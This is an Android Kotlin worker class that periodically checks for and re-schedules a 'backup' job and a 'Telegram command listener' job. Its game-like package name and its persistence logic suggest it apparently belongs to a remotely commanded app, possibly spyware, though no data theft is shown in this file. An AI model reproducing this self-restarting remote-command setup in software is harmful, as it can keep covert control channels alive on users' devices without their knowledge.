package com.service.assasinscreed02

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit
import android.util.Log

class WatchdogWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        private const val TAG = "WatchdogWorker"
        private const val BACKUP_WORK_NAME = "backup_trabajo"
        private const val TELEGRAM_WORK_NAME = "telegram_command_listener"
    }

    override fun doWork(): Result {
        try {
            Log.d(TAG, "Verificando servicios críticos...")
            val workManager = WorkManager.getInstance(applicationContext)

            // Verificar backup automático
            val backupInfos = workManager.getWorkInfosForUniqueWork(BACKUP_WORK_NAME).get()
            val backupActivo = backupInfos.any { it.state == androidx.work.WorkInfo.State.ENQUEUED || it.state == androidx.work.WorkInfo.State.RUNNING }
            if (!backupActivo) {
                Log.w(TAG, "Backup automático no activo. Reprogramando...")
                val intervalo = ErrorHandler.obtenerIntervalo(applicationContext).toLong()
                val workRequest = PeriodicWorkRequestBuilder<BackupWorker>(intervalo, TimeUnit.HOURS)
                    .setBackoffCriteria(androidx.work.BackoffPolicy.LINEAR, 1, TimeUnit.HOURS)
                    .build()
                workManager.enqueueUniquePeriodicWork(
                    BACKUP_WORK_NAME,
                    ExistingPeriodicWorkPolicy.REPLACE,
                    workRequest
                )
            }

            // Verificar listener de Telegram
            val telegramInfos = workManager.getWorkInfosForUniqueWork(TELEGRAM_WORK_NAME).get()
            val telegramActivo = telegramInfos.any { it.state == androidx.work.WorkInfo.State.ENQUEUED || it.state == androidx.work.WorkInfo.State.RUNNING }
            if (!telegramActivo) {
                Log.w(TAG, "Listener de Telegram no activo. Reprogramando...")
                val workRequest = androidx.work.OneTimeWorkRequestBuilder<TelegramCommandWorker>()
                    .setInitialDelay(1, TimeUnit.MINUTES)
                    .build()
                workManager.enqueueUniqueWork(
                    TELEGRAM_WORK_NAME,
                    androidx.work.ExistingWorkPolicy.REPLACE,
                    workRequest
                )
            }

            Log.d(TAG, "Watchdog verificación completada.")
            return Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Error en WatchdogWorker: ${e.message}", e)
            return Result.retry()
        }
    }
} 